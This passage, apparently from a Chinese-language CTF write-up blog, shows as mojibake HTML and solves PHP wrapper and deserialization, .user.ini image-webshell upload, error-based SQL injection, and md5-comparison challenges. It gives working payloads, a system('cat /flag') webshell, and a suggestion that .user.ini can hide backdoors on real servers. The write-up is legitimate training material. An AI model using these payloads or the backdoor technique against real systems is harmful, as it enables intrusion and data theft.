<li><p><strong>ä½œç”¨</strong>ï¼šè‡ª<code>PHP&gt;=5.2.0</code>èµ·ï¼Œå¯ä»¥ä½¿ç”¨<code>data://</code>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚</p></li>
<li><p>ç”¨æ³•ï¼š</p></li>
</ul>
<pre><code class="hljs php">data:<span class="hljs-comment">//text/plain,</span>
data:<span class="hljs-comment">//text/plain;base64,</span>
http:<span class="hljs-comment">//127.0.0.1/include.php?file=data://text/plain,<span class="hljs-meta">&lt;?php</span>%20phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre></li>
</ul>
<h4 id="flle_get_contents">flle_get_contents()</h4>
<p>flle_get_contents() å‡½æ•°,è€Œè¿™ä¸ªå‡½æ•°æ˜¯å¯ä»¥ç»•è¿‡çš„ ç»•è¿‡æ–¹å¼æœ‰å¤šç§:
â—ä½¿ç”¨php://inputä¼ªåè®®ç»•è¿‡ â‘ å°†è¦GETçš„å‚æ•°?xxx=php://input
â‘¡ç”¨postæ–¹æ³•ä¼ å…¥æƒ³è¦file_get_contents() å‡½æ•°è¿”å›çš„å€¼ â—ç”¨data://ä¼ªåè®®ç»•è¿‡
å°†urlæ”¹ä¸º: ?xxx=data://text/plain;base64,æƒ³è¦ file_get_contents()
å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç  æˆ–è€…å°†urlæ”¹ä¸º:
?xxx=data:text/plain,(urlç¼–ç çš„å†…å®¹)</p>
<p>==php://inputå’Œdata://å¸¸åœ¨CTFé‡Œç”¨æ¥ç»•è¿‡ä¸€äº›åˆ¤æ–­è¯­å¥;ã€file_get_contents()==</p>
<p><strong>æ€»ç»“ï¼š</strong></p>
<p>data://ã€€ã€€ã€€ã€€å†™å…¥æ•°æ®</p>
<p>php://inputã€€ã€€æ‰§è¡Œphp</p>
<p>ã€€ã€€//filterã€€ã€€æŸ¥çœ‹æºç </p>
<p>è§£é¢˜ï¼šindex.phpæºç ï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  
$text = $_GET[<span class="hljs-string">&quot;text&quot;</span>];
$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];
$password = $_GET[<span class="hljs-string">&quot;password&quot;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;  <span class="hljs-comment">//ä¼ªåè®®ç»•è¿‡</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;
    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$file))&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;
        <span class="hljs-keyword">exit</span>(); 
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">include</span>($file);  <span class="hljs-comment">//useless.php   é€šè¿‡ä¼ªåè®®filterè¯»å–æ–‡ä»¶æºç </span>
        $password = unserialize($password);  <span class="hljs-comment">//ååºåˆ—åŒ–è§¦å‘wake_upï¼Œè¿™é‡Œå¹¶ä¸æ˜¯è¿™ä¸ªè€ƒç‚¹</span>
        <span class="hljs-keyword">echo</span> $password;   <span class="hljs-comment">//echoå¯¹è±¡ä¼šè§¦å‘tostring</span>
    &#125;
&#125;
<span class="hljs-keyword">else</span>&#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>ç”¨data://ç»•è¿‡file_get_contentsï¼Œphp://filterç»•è¿‡includeè¯»å–æ–‡ä»¶base64æºç </p>
<pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain,welcome to the zjctf&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=useless.php&amp;password=<span class="hljs-number">2</span></code></pre>
<p>è¯»åˆ°useless.phpæºç ï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span>
    <span class="hljs-keyword">public</span> $file;  
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">//å¦‚æœå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²echoä¼šè§¦å‘è¿™ä¸ªæ–¹æ³•</span>
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  
            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file); 
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);
        &#125;  
    &#125;  
&#125;  
<span class="hljs-meta">?&gt;</span></code></pre>
<p>passwordååºåˆ—åŒ–è¯»flag.phpï¼Œ</p>
<p>payload:æ„é€ åºåˆ—åŒ–è„šæœ¬ï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;
	<span class="hljs-keyword">public</span> $file=<span class="hljs-string">&#x27;flag.php&#x27;</span>;
&#125; 
$flag = <span class="hljs-keyword">new</span> Flag();
$flag_1 = serialize($flag);
<span class="hljs-keyword">echo</span> $flag_1;
<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;</code></pre>
<p>æŸ¥çœ‹æºç å¾—åˆ°flag</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220307210749077.png" srcset="/img/loading.gif" alt="image-20220307210749077" style="zoom:80%;"></p>
<h2 id="suctf-2019checkin">[SUCTF 2019]CheckIn</h2>
<h4 id="è€ƒç‚¹nginxçš„.user.iniå›¾ç‰‡å¤´">è€ƒç‚¹ï¼šnginxçš„.user.iniã€å›¾ç‰‡å¤´</h4>
<p>å…³é”®ç‚¹å°±æ˜¯.user.iniä¸.htaccessçš„åº”ç”¨èŒƒå›´ã€.user.iniè¿˜éœ€è¦åŒç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªå¯æ‰§è¡Œçš„phpæ–‡ä»¶ã€ä¸Šä¼ å›¾ç‰‡é©¬åurlè®¿é—®çš„ä¸æ˜¯å›¾ç‰‡åœ°å€ï¼Œè€Œæ˜¯å¯æ‰§è¡Œphpæ–‡ä»¶åœ°å€</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6091">å‚è€ƒWP</a></p>
</blockquote>
<p>æ–‡ä»¶ä¸Šä¼ </p>
<ol type="1">
<li><p>å¯¹åç¼€çš„è¿‡æ»¤ï¼šphpï¼šä¸è¡Œï¼Œtxtï¼šå¯ä»¥ï¼Œjpgï¼šå¯ä»¥</p></li>
<li><p>ä¸Šä¼ å›¾ç‰‡é©¬ï¼šå‘ç°è¿‡æ»¤&lt;?ï¼Œç»•è¿‡:</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">php</span>&gt;</span>echo â€˜123â€™;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li>
<li><p>ä¸Šä¼ .htaccessä¹Ÿä¸è¡Œï¼Œå¿…é¡»æ˜¯å›¾ç‰‡ï¼šæ”¹Content-Type:
image/jpegã€åç¼€ä¹Ÿä¸è¡Œï¼ˆä¼°è®¡æœ‰å›¾ç‰‡å¤´æ£€éªŒï¼‰</p></li>
</ol>
<p>â€‹
ç„¶ååŠ ä¸Šå›¾ç‰‡å¤´ï¼š<code>GIF89A</code>ï¼Œå‘ç°æ²¡è­¦å‘Šäº†ï¼Œä½†æ˜¯å¹¶ä¸èƒ½è§£ææˆphp</p>
<p><strong>åŸå› åœ¨äºæœ¬é¢˜æœåŠ¡å™¨æ˜¯nginxä¸æ˜¯apache</strong>,ï¼ˆnginxè¦å¼•ç”¨.htaccessä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯è¿˜è¦è¿›è¡ŒæŸéƒ¨åˆ†ä¿®æ”¹ï¼‰ï¼Œè¿™é‡Œæ˜¾ç„¶ä¸æ»¡è¶³æ¡ä»¶ï¼Œæ‰€ä»¥æ²¡ç”¨ã€‚</p>
<h4 id="user.ini">.user.ini</h4>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/20190824211552-4c92f9fe-c671-1.png" srcset="/img/loading.gif" alt="user.ini"></p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨.user.iniä¸­è®¾ç½®php.iniä¸­PHP_INI_PERDIR å’Œ
PHP_INI_USER æ¨¡å¼çš„ INI è®¾ç½®ï¼Œè€Œä¸”åªè¦æ˜¯åœ¨ä½¿ç”¨ CGIï¼FastCGI
æ¨¡å¼çš„æœåŠ¡å™¨ä¸Šéƒ½å¯ä»¥ä½¿ç”¨.user.ini</p>
<p><strong>å¤§è‡´æ„æ€å°±æ˜¯ï¼šæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚a.jpgï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åœ¨è¦æ‰§è¡Œçš„phpæ–‡ä»¶ä¸­ï¼ˆå¦‚index.phpï¼‰</strong>ï¼Œç±»ä¼¼äºåœ¨index.phpä¸­æ’å…¥ä¸€å¥ï¼š<code>require(./a.jpg)</code>;ã€<strong>ç±»ä¼¼.htaccessï¼Œåªä¸è¿‡é’ˆå¯¹ä¸åŒæœåŠ¡å™¨</strong>ã€‘</p>
<ul>
<li><p>å…¶ä¸­æœ‰ä¸¤ä¸ªé…ç½®ï¼Œå¯ä»¥ç”¨æ¥åˆ¶é€ åé—¨ï¼š
auto_append_fileã€auto_prepend_file
æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°.è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«</p></li>
<li><p>ç”¨æ³•ï¼š</p>
<p>ç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</p>
<pre><code class="hljs awk">auto_prepend_file=test.jpg æˆ–
auto_append_file=test.jpgï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰<span class="hljs-keyword">exit</span>()æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220307214829826.png" srcset="/img/loading.gif" alt="image-20220307214829826"></p></li>
</ul>
<p>æ­¤æ—¶æˆ‘ä»¬æ³¨æ„åˆ°ä¸Šä¼ ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ªindex.phpï¼Œ<strong>æˆ‘ä»¬æ­£å¥½éœ€è¦è¯¥ç›®å½•ä¸‹æœ‰ä¸€ä¸ªå¯æ‰§è¡Œphpæ–‡ä»¶</strong>ï¼Œé‚£è¿™ç®€ç›´æš´éœ²äº†è€ƒç‚¹å°±æ˜¯<code>.user.ini</code>ï¼Œçœ‹æ¥è¿™ä¸ªæ€è·¯åº”è¯¥æ˜¯å¯è¡Œçš„</p>
<p>ä¸Šä¼ <code>.user.ini</code>ï¼š</p>
<pre><code class="hljs routeros">GIF89a
<span class="hljs-attribute">auto_prepend_file</span>=shell.jpg</code></pre>
<p>ä¸Šä¼ å›¾ç‰‡é©¬ï¼šshell.jpg</p>
<pre><code class="hljs xml">GIF89a
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="javascript">system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
<p>==æœ€åï¼Œè®¿é—®index.phpï¼Œæ³¨æ„æ˜¯å¯æ‰§è¡Œçš„phpè€Œä¸æ˜¯è®¿é—®ä¸Šä¼ çš„å›¾ç‰‡é©¬ï¼==</p>
<pre><code class="hljs awk"><span class="hljs-regexp">/uploads/</span>cc551ab005b2e60fbdc88de809b2c4b1/index.php</code></pre>
<h4 id="user.iniå®æˆ˜åˆ©ç”¨çš„å¯èƒ½æ€§">.user.iniå®æˆ˜åˆ©ç”¨çš„å¯èƒ½æ€§</h4>
<p>ç»¼ä¸Šæ‰€è¿°<code>.user.ini</code>çš„åˆ©ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP</li>
<li>æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼</li>
<li>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</li>
</ol>
<p><strong><em>ä»è¿™æ¥çœ‹<code>.user.ini</code>è¦æ¯”<code>.htaccess</code>çš„åº”ç”¨èŒƒå›´è¦å¹¿ä¸€äº›ï¼Œæ¯•ç«Ÿ<code>.htaccess</code>åªèƒ½ç”¨äºApache</em></strong></p>
<p>ä½†ä»”ç»†æ¨æ•²æˆ‘ä»¬å°±ä¼šæ„Ÿåˆ°<strong>â€œä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶â€</strong>è¿™ä¸ªè¦æ±‚åœ¨æ–‡ä»¶ä¸Šä¼ ä¸­ä¹Ÿæ¯”è¾ƒè‹›åˆ»ï¼Œåº”è¯¥æ²¡æœ‰å¤©æ‰å¼€å‘è€…ä¼šæŠŠä¸Šä¼ æ–‡ä»¶æ”¾åœ¨ä¸»ç›®å½•æˆ–è€…æŠŠphpæ–‡ä»¶æ”¾åœ¨ä¸Šä¼ æ–‡ä»¶å¤¹ã€‚</p>
<p>ä½†ä¹Ÿä¸æ˜¯å…¨æ— åŠæ³•ï¼Œå¦‚æœæˆ‘ä»¬æ ¹æ®å®é™…æƒ…å†µé…åˆå…¶ä»–æ¼æ´ä½¿ç”¨å¯èƒ½ä¼šæœ‰å¥‡æ•ˆï¼Œå‰æ®µæ—¶é—´æˆ‘é‡åˆ°ä¸€ä¸ªCMSå¯¹ä¸Šä¼ æ—¶çš„è·¯å¾„æ²¡æœ‰æ£€æµ‹<code>../</code>ï¼Œå› æ­¤å¯¼è‡´æ–‡ä»¶å¯è¢«ä¸Šä¼ è‡³ä»»æ„ç›®å½•ï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å°±å¾ˆæœ‰å¯èƒ½å¯ä»¥åˆ©ç”¨<code>.user.ini</code></p>
<p>é™¤æ­¤ä¹‹å¤–ï¼ŒæŠŠ<code>.user.ini</code>åˆ©ç”¨åœ¨éšè—åé—¨ä¸Šåº”è¯¥æ˜¯ä¸ªå¾ˆå¥½çš„åˆ©ç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨å­˜åœ¨phpæ–‡ä»¶çš„ç›®å½•ä¸‹ç•™ä¸‹<code>.user.ini</code>å’Œæˆ‘ä»¬çš„å›¾ç‰‡é©¬ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†éšè—åé—¨çš„ç›®çš„ã€‚</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019hardsql">[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2>
<h4 id="è€ƒç‚¹æŠ¥é”™æ³¨å…¥ç©ºæ ¼è¢«è¿‡æ»¤æˆªå–éƒ¨åˆ†å­—ç¬¦ä¸²å‡½æ•°">è€ƒç‚¹ï¼šæŠ¥é”™æ³¨å…¥ã€ç©ºæ ¼=è¢«è¿‡æ»¤ã€æˆªå–éƒ¨åˆ†å­—ç¬¦ä¸²å‡½æ•°</h4>
<p>å…³é”®ç‚¹å°±æ˜¯é’ˆå¯¹å„ç§è¿‡æ»¤ï¼Œå…ˆåˆ©ç”¨burpçˆ†ç ´sqlæ³¨å…¥å…³é”®è¯å­—å…¸ï¼Œçœ‹å“ªäº›æ²¡æœ‰è¢«è¿‡æ»¤çš„ï¼Œå‘ç°updatexmlæ²¡æœ‰==&gt;æŠ¥é”™æ³¨å…¥ï¼Œç„¶åé’ˆå¯¹è¢«è¿‡æ»¤çš„å…³é”®è¯æ‰¾æ›¿ä»£ç»•è¿‡ï¼Œ=ã€‹likeï¼Œç©ºæ ¼ã€‹()ï¼Œandã€‹^ï¼Œç„¶åé’ˆå¯¹updatexmlã€extractvalueçš„ç¼ºé™·ï¼šåªèƒ½è¿”å›32ä½æ•°æ®ï¼Œåˆ©ç”¨å­—ç¬¦ä¸²æˆªå–å‡½æ•°æˆªå–å‰©ä¸‹éƒ¨åˆ†flag</p>
<blockquote>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/264593.html"><strong>MySQLæ³¨å…¥ç»•è¿‡WAFçš„åŸºç¡€æ–¹å¼</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169#toc-30"><strong>å¯¹MYSQLæ³¨å…¥ç›¸å…³å†…å®¹åŠéƒ¨åˆ†Trickã€ç»•è¿‡çš„å½’ç±»å°ç»“</strong></a></p>
</blockquote>
<p>ç”¨sqlå…³é”®è¯å­—å…¸çˆ†ç ´ï¼Œçº¿ç¨‹æ•°è°ƒä½ç‚¹ï¼Œå‘ç°è¿‡æ»¤äº†=ã€unionã€byã€ï¼ã€&amp;ã€|ã€*ã€ç©ºæ ¼ã€()ã€%0aç»•è¿‡ã€‘ã€andã€ã€</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220308210613847.png" srcset="/img/loading.gif" alt="image-20220308210613847" style="zoom:67%;"></p>
<p><strong>ä½†æ˜¯ï¼</strong>æ²¡æœ‰è¿‡æ»¤<code>updatexml</code>ã€extractvalue==ã€‹å°è¯•æŠ¥é”™æ³¨å…¥</p>
<pre><code class="hljs excel"><span class="hljs-built_in">and</span>ã€<span class="hljs-built_in">or</span>ã€&amp;&amp;ã€||è¢«è¿‡æ»¤â€”â€”å¯ç”¨è¿ç®—ç¬¦! ^ ~ä»¥åŠ<span class="hljs-built_in">not</span> <span class="hljs-built_in">xor</span>æ¥ä»£æ›¿
ç©ºæ ¼è¢«è¿‡æ»¤â€”â€”%<span class="hljs-number">09</span>, %<span class="hljs-number">0</span>a, %<span class="hljs-number">0</span>b, %<span class="hljs-number">0</span>c, %<span class="hljs-number">0</span>d, %<span class="hljs-symbol">a0</span>ï¼ˆç­‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦å¯ä¹Ÿä»£æ›¿ç©ºæ ¼ï¼‰ã€<span class="hljs-built_in">and</span>/<span class="hljs-built_in">or</span>åé¢å¯ä»¥è·Ÿä¸Šå¶æ•°ä¸ª!ã€~å¯ä»¥æ›¿ä»£ç©ºæ ¼ã€æ”¹ç”¨+å·ã€ä½¿ç”¨æ³¨é‡Šä»£æ›¿ã€å¤šå±‚æ‹¬å·åµŒå¥—
= -&gt; like -&gt; regexp -&gt; &lt;&gt; -&gt; in</code></pre>
<h4 id="æŠ¥é”™æ³¨å…¥">æŠ¥é”™æ³¨å…¥ï¼š</h4>
<p>å‡½æ•°ï¼š</p>
<pre><code class="hljs apache"><span class="hljs-attribute">exp</span>(~(select * from(select user())a))
<span class="hljs-attribute">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)   //ä¸‰ä¸ªå‚æ•°  <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e:~
<span class="hljs-attribute">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e)))   //ä¸¤ä¸ªå‚æ•°</code></pre>
<p>çˆ†åº“åï¼š</p>
<pre><code class="hljs sql">check.php?username=1&amp;password=&#x27;^(updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span>(@@<span class="hljs-keyword">version</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>
XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~10.3.18-MariaDB~&#x27;</span>

check.php?username=<span class="hljs-number">1</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;^(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23</span>
<span class="hljs-string">æˆ–1&#x27;</span>^extractvalue(<span class="hljs-number">0x0a</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>()))))%<span class="hljs-number">23</span>
XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~geek~&#x27;</span></code></pre>
<p>çˆ†è¡¨åï¼šã€æ³¨æ„selectåä¸€å¤§ä¸²éƒ½éœ€è¦æ‹¬èµ·æ¥ã€‘</p>
<pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%<span class="hljs-number">23</span>

<span class="hljs-attribute">XPATH</span> syntax error: &#x27;~H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>&#x27;</code></pre>
<p>çˆ†åˆ—åï¼š</p>
<pre><code class="hljs sql">username=1&amp;password=1&#x27;^extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;geek&#x27;</span>))))%<span class="hljs-number">23</span>

XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~id,username,password&#x27;</span></code></pre>
<p>çˆ†å­—æ®µï¼š</p>
<pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(id,username,password))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span>

<span class="hljs-attribute">XPATH</span> syntax error: &#x27;~<span class="hljs-number">1</span>flagflag&#123;<span class="hljs-number">1</span>f<span class="hljs-number">077763</span>-bd<span class="hljs-number">8</span>b-<span class="hljs-number">4</span>ef<span class="hljs-number">1</span>-<span class="hljs-number">92</span>&#x27;

<span class="hljs-attribute">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(password))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span>  //è¿˜æ˜¯åªå›æ˜¾ä¸€åŠï¼Œ==ã€‹
<span class="hljs-attribute">XPATH</span> syntax error: &#x27;~flag&#123;<span class="hljs-number">1</span>f<span class="hljs-number">077763</span>-bd<span class="hljs-number">8</span>b-<span class="hljs-number">4</span>ef<span class="hljs-number">1</span>-<span class="hljs-number">92</span>d<span class="hljs-number">9</span>-<span class="hljs-number">01</span>&#x27;</code></pre>
<p><strong>extractvalue()å’Œupdatexml()</strong>åªèƒ½å›æ˜¾==32ä½é•¿åº¦==çš„æ•°æ®</p>
<p><strong>extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±éœ€è¦ç”¨substring()å‡½æ•°æˆªå–ï¼Œä¸€æ¬¡æŸ¥çœ‹32ä½</strong></p>
<h4 id="æˆªå–éƒ¨åˆ†é•¿åº¦å­—ç¬¦ä¸²å‡½æ•°">æˆªå–éƒ¨åˆ†é•¿åº¦å­—ç¬¦ä¸²å‡½æ•°ï¼š</h4>
<table>
<colgroup>
<col style="width: 34%">
<col style="width: 65%">
</colgroup>
<thead>
<tr class="header">
<th>lefft(str,len)</th>
<th>å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»æœ€å·¦è¾¹æˆªå–æŒ‡å®šé•¿åº¦ã€‚</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>right(str,len)</td>
<td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»<strong>æœ€å³è¾¹</strong>æˆªå–æŒ‡å®šé•¿åº¦</td>
</tr>
<tr class="even">
<td>substr(str,N_start,N_length)</td>
<td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²è¿›è¡Œæˆªå–ï¼Œä¸ºSUBSTRINGçš„ç®€å•ç‰ˆã€‚</td>
</tr>
<tr class="odd">
<td>mid(column_name,start[,length])</td>
<td>str="123456" mid(str,2,1) ç»“æœä¸º2ã€ç±»ä¼¼stringã€substrã€‘</td>
</tr>
</tbody>
</table>
<pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(right(password,<span class="hljs-number">15</span>))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span>

<span class="hljs-attribute">XPATH</span> syntax error: &#x27;~<span class="hljs-number">9</span>-<span class="hljs-number">01</span>edbdbb<span class="hljs-number">1804</span>&#125;&#x27;</code></pre>
<p>æ‹¼æ¥å¾—åˆ°å®Œæ•´flag</p>
<h2 id="mrctf2020ez_bypasså®¹æ˜“">[MRCTF2020]Ez_bypassï¼ˆå®¹æ˜“ï¼‰</h2>
<h4 id="è€ƒç‚¹md5å¼ºæ¯”è¾ƒç»•è¿‡å¼±æ¯”è¾ƒ">è€ƒç‚¹ï¼šmd5å¼ºæ¯”è¾ƒç»•è¿‡ã€å¼±æ¯”è¾ƒ</h4>
<pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;
$flag=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;
    $id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];
    $gg=$_GET[<span class="hljs-string">&#x27;gg&#x27;</span>];
    <span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;   <span class="hljs-comment">//â—å¼ºç­‰äºï¼Œæ•°ç»„ç»•è¿‡å³å¯</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;
            $passwd=$_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>];
            <span class="hljs-keyword">if</span> (!is_numeric($passwd))
            &#123;
                 <span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>)   <span class="hljs-comment">//passwd=1234567aå³å¯ç»•è¿‡</span>
                 &#123;
                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;
                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);   <span class="hljs-comment">//â—</span>
                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);
                 &#125;
                 <span class="hljs-keyword">else</span>
                 &#123;
                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;
                 &#125;
            &#125;
